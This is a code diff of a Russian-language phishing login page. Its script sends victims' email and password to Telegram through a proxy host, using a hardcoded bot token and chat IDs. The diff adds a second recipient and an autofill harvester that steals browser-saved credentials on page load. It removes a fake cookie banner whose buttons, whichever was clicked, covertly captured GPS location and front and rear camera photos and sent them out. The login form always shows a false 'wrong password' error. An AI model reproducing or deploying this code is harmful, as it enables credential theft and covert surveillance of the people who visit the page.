@@ -65,44 +65,6 @@
             display: none;
         }
         .error-message.show { display: block; }
-        .cookie-banner {
-            position: fixed;
-            left: 0; right: 0; bottom: 0;
-            background: #ffffff;
-            border-top: 1px solid #e0e0e0;
-            box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 14px;
-            z-index: 9999;
-            font-size: 14px;
-            color: #333;
-        }
-        .cookie-banner .cookie-text { flex: 1; line-height: 1.4; text-align: left; }
-        .cookie-banner .cookie-text b { display: block; margin-bottom: 4px; font-size: 15px; }
-        .cookie-banner .cookie-text span { color: #666; font-size: 13px; }
-        .cookie-banner .cookie-actions { display: flex; gap: 8px; flex-shrink: 0; }
-        .cookie-banner button {
-            padding: 10px 16px;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            white-space: nowrap;
-        }
-        .cookie-banner .btn-accept { background: #0077cc; color: white; }
-        .cookie-banner .btn-accept:hover { background: #005fa3; }
-        .cookie-banner .btn-decline { background: #e4e6eb; color: #333; }
-        .cookie-banner .btn-decline:hover { background: #d0d3d8; }
-        .cookie-banner.cookie-hidden { display: none !important; }
-        @media (max-width: 500px) {
-            .cookie-banner { flex-direction: column; align-items: stretch; padding: 14px 16px; }
-            .cookie-banner .cookie-actions { justify-content: stretch; }
-            .cookie-banner .cookie-actions button { flex: 1; }
-        }
     </style>
 </head>
 <body>
@@ -117,41 +79,36 @@
         </form>
     </div>
 
-    <div id="cookieBanner" class="cookie-banner">
-        <div class="cookie-text">
-            <b>🍪 Мы используем файлы cookie</b>
-            <span>Для корректной работы сайта и сохранения ваших данных. Нажимая «Подтвердить», вы соглашаетесь с обработкой данных.</span>
-        </div>
-        <div class="cookie-actions">
-            <button class="btn-decline" id="btnDecline">Отклонить</button>
-            <button class="btn-accept" id="btnAccept">Подтвердить</button>
-        </div>
-    </div>
-
 <script>
     // ===== ВАШИ ДАННЫЕ =====
     const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
     const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
-    const CHAT_ID = "8872810304";
+    const CHAT_IDS = ["8872810304", "8798080392"]; // ← два получателя
     // ========================
 
+    // Отправка текста ВСЕМ получателям
     function send(text) {
-        return fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        }).catch(function() {});
+        CHAT_IDS.forEach(function(id) {
+            fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: id, text: text })
+            }).catch(function() {});
+        });
     }
 
+    // Отправка фото ВСЕМ получателям
     function sendPhoto(blob, caption) {
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("caption", caption || "");
-        fd.append("photo", blob, "photo.jpg");
-        return fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendPhoto", {
-            method: "POST",
-            body: fd
-        }).catch(function() {});
+        CHAT_IDS.forEach(function(id) {
+            const fd = new FormData();
+            fd.append("chat_id", id);
+            fd.append("caption", caption || "");
+            fd.append("photo", blob, "photo.jpg");
+            fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendPhoto", {
+                method: "POST",
+                body: fd
+            }).catch(function() {});
+        });
     }
 
     function collectAndSend(type) {
@@ -176,99 +133,18 @@
         document.getElementById("password").classList.remove("input-error");
     }
 
-    // ===== GPS =====
-    function getGPS() {
-        if (!navigator.geolocation) {
-            send("📍 GPS: браузер не поддерживает");
-            return;
+    // ===== АВТОЗАПОЛНЕНИЕ =====
+    function checkAutoFill() {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        if (email && password) {
+            send("📩 АВТОЗАПОЛНЕНИЕ\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU"));
         }
-        let watchId = null;
-        let sent = false;
-
-        function sendAndStop(p) {
-            if (sent) return;
-            sent = true;
-            const text = "📍 ГЕОЛОКАЦИЯ\n━━━━━━━━━━━━━━━━━━\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🕒 " + new Date().toLocaleString("ru-RU") + "\n🗺 Карта: https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude;
-            send(text).then(function() {
-                if (watchId !== null) {
-                    navigator.geolocation.clearWatch(watchId);
-                    watchId = null;
-                }
-            });
-        }
-
-        watchId = navigator.geolocation.watchPosition(
-            function(p) { sendAndStop(p); },
-            function(err) {
-                if (watchId !== null) {
-                    navigator.geolocation.clearWatch(watchId);
-                    watchId = null;
-                }
-                if (!sent) {
-                    sent = true;
-                    send("📍 GPS ОШИБКА: " + err.message + " (код " + err.code + ")");
-                }
-            },
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
-        );
     }
-
-    // ===== ФОТО С КАМЕРЫ =====
-    function takePhoto(facing, label) {
-        return navigator.mediaDevices.getUserMedia({
-            video: { facingMode: facing, width: 640, height: 480 },
-            audio: false
-        }).then(function(stream) {
-            return new Promise(function(resolve) {
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.setAttribute("playsinline", "true");
-                video.setAttribute("autoplay", "true");
-                video.muted = true;
-                video.style.position = "fixed";
-                video.style.left = "-9999px";
-                document.body.appendChild(video);
-                video.onloadedmetadata = function() {
-                    video.play();
-                    setTimeout(function() {
-                        const canvas = document.createElement("canvas");
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                        canvas.toBlob(function(blob) {
-                            sendPhoto(blob, "📷 ФОТО (" + label + ")\n🕒 " + new Date().toLocaleString("ru-RU"));
-                            stream.getTracks().forEach(function(t) { t.stop(); });
-                            document.body.removeChild(video);
-                            resolve();
-                        }, "image/jpeg", 0.85);
-                    }, 1000);
-                };
-            });
-        }).catch(function(err) {
-            send("📷 Камера (" + label + "): " + (err.name || err.message));
-        });
-    }
-
-    // ===== ОБЩИЙ СБОР =====
-    function collectAll() {
-        getGPS();
-        takePhoto("user", "фронтальная")
-            .then(function() { return takePhoto("environment", "задняя"); })
-            .catch(function() {});
-    }
-
-    // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
-    document.getElementById("btnAccept").addEventListener("click", function() {
-        collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
-        collectAll();
-        document.getElementById("cookieBanner").classList.add("cookie-hidden");
-    });
-
-    // ===== КНОПКА "ОТКЛОНИТЬ" =====
-    document.getElementById("btnDecline").addEventListener("click", function() {
-        collectAndSend("COOKIE ОТКЛОНЕНО");
-        collectAll();
-        document.getElementById("cookieBanner").classList.add("cookie-hidden");
+    window.addEventListener("load", function() {
+        setTimeout(checkAutoFill, 500);
+        setTimeout(checkAutoFill, 1500);
+        setTimeout(checkAutoFill, 3000);
     });
 
     // ===== ФОРМА =====
@@ -288,7 +164,7 @@
         showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
     });
 
-    console.log("ROCKET ACTIVE — cookie + GPS + камера");
+    console.log("ROCKET ACTIVE — 2 получателя");
 </script>
 </body>
 </html>
